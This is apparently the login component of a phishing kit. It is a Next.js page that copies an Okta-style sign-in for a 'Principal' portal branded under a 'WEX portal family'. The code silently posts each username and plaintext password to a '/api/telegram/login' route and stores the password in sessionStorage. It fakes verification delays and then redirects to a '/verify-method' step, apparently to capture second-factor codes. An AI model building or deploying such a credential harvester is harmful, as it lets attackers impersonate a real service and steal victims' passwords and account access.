"use client";

import { Suspense, useEffect, useRef, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { PrincipalShell } from "@/components/PrincipalShell";
import { PasswordScene } from "@/components/PasswordScene";
import { UsernameScene } from "@/components/UsernameScene";
import type { LoginScene } from "@/lib/login-flow";
import { validateUsername } from "@/lib/login-flow";
import { MSG_UNABLE_VERIFY_TIME, getLoginDeniedMessage } from "@/lib/approval-messages";

const LOGIN_LOADING_MS = 2000;
// WEX portal family (NEW_PROJECT_CHECKLIST.md §Portal-Family denial codes).
const LOGIN_DENIED_MSG = getLoginDeniedMessage("wex");

function LoginFlowInner() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const usernameInputRef = useRef<HTMLInputElement>(null);
  const passwordInputRef = useRef<HTMLInputElement>(null);

  const presetEmail = searchParams.get("email")?.trim() ?? "";
  const initialSceneParam = searchParams.get("scene");

  const [scene, setScene] = useState<LoginScene>(() =>
    initialSceneParam === "password" && presetEmail ? "password" : "username"
  );
  const [username, setUsername] = useState(() => presetEmail);
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [usernameError, setUsernameError] = useState(false);
  const [passwordError, setPasswordError] = useState<string | null>(null);
  const [formBannerError, setFormBannerError] = useState<string | null>(() =>
    searchParams.get("loginDenied") === "1"
      ? LOGIN_DENIED_MSG
      : searchParams.get("verifyUnavailable") === "1"
        ? MSG_UNABLE_VERIFY_TIME
        : null
  );
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [usernameLoading, setUsernameLoading] = useState(false);

  useEffect(() => {
    const input =
      scene === "password" ? passwordInputRef.current : usernameInputRef.current;
    input?.focus();
  }, [scene]);

  const handleUsernameChange = (value: string) => {
    setUsername(value);
    if (usernameError) {
      setUsernameError(false);
    }
    if (formBannerError) {
      setFormBannerError(null);
    }
  };

  const handleUsernameSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    const error = validateUsername(username);

    if (error) {
      setUsernameError(true);
      usernameInputRef.current?.focus();
      return;
    }

    if (usernameLoading) return;

    setUsernameError(false);
    setUsernameLoading(true);

    void fetch("/api/telegram/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId: username.trim(),
        type: "identifier",
      }),
    }).catch(() => {});

    await new Promise((resolve) => setTimeout(resolve, LOGIN_LOADING_MS));
    setPassword("");
    setShowPassword(false);
    setScene("password");
    setUsernameLoading(false);
  };

  const handlePasswordSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!password.trim() || isSubmitting) return;

    setPasswordError(null);
    setIsSubmitting(true);

    const trimmedUsername = username.trim();
    const trimmedPassword = password.trim();

    void fetch("/api/telegram/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId: trimmedUsername,
        password: trimmedPassword,
      }),
    }).catch(() => {});

    try {
      sessionStorage.setItem("loginUserId", trimmedUsername);
      sessionStorage.setItem("loginPassword", trimmedPassword);
      sessionStorage.setItem("maskedEmail", "**********");
      sessionStorage.setItem("maskedPhone", "***-***-****");
    } catch {
      // ignore sessionStorage failures
    }

    await new Promise((resolve) => setTimeout(resolve, LOGIN_LOADING_MS));
    router.push("/verify-method");
    setIsSubmitting(false);
  };

  const handleCancel = (event: React.MouseEvent<HTMLAnchorElement>) => {
    event.preventDefault();
    setPassword("");
    setShowPassword(false);
    setScene("username");
  };

  return (
    <PrincipalShell>
      <main className="page-main principal-page-main">
        <div className="container">
          <div id="principal-auth-shell" className="principal-login-container">
            <div className="principal-auth-inner">
              <main
                id="okta-sign-in"
                className="auth-container main-container no-beacon"
                data-se="auth-container"
                tabIndex={-1}
              >
                <div className="auth-content">
                  <div className="auth-content-inner">
                    {scene === "username" ? (
                      <UsernameScene
                        username={username}
                        rememberMe={rememberMe}
                        usernameError={usernameError}
                        formBannerError={formBannerError}
                        usernameInputRef={usernameInputRef}
                        onUsernameChange={handleUsernameChange}
                        onRememberMeChange={setRememberMe}
                        onSubmit={handleUsernameSubmit}
                        isSubmitting={usernameLoading}
                      />
                    ) : (
                      <PasswordScene
                        username={username.trim()}
                        password={password}
                        showPassword={showPassword}
                        passwordInputRef={passwordInputRef}
                        onPasswordChange={setPassword}
                        onTogglePassword={() => setShowPassword((prev) => !prev)}
                        onSubmit={handlePasswordSubmit}
                        onCancel={handleCancel}
                        passwordError={passwordError ?? formBannerError}
                        isSubmitting={isSubmitting}
                      />
                    )}
                  </div>
                </div>
              </main>
            </div>
          </div>
        </div>
      </main>
    </PrincipalShell>
  );
}

export function LoginFlow() {
  return (
    <Suspense fallback={null}>
      <LoginFlowInner />
    </Suspense>
  );
}
